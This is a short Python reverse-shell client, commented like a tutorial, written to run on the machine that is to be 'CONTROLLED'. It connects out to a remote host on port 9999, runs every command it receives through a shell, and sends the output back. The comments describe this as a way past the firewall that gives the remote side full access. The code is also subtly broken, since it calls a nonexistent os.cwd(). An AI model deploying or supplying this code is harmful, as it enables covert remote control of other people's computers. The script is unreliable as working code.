#Reverse Shell uses a CLIENT initiated connection
#It connects to the server
#As it is initiated from the client, the firewall is bypassed and server can get full access to the client
#This file is run on the computer which will be CONTROLLED

import socket
import os #Allows to control the operating system
import subprocess

s = socket.socket()
host = '192.168.56.1'
port = 9999
s.connect((host,port))

while True:
    data = s.recv(1024)
    #We have to handle CD differently, as there isnt really an output for that
    #Just the directory is changed
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
         #Run a command just as you would in a terminal
         #Need a subprocess for that. The Subprocess PiPe takes any output and pipes it to standard output
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes, "utf-8")
         #we use the os.cwd to output the current working directory and show it on the terminal
         #Whenever we enter a command like 'dir' we see the output, and then the cursor goes to a new line
         #We also see the CWD there
         s.send(str.encode(output_str + str(os.cwd()) + '> '))
         print(output_str)

#Close COnnection
s.close()




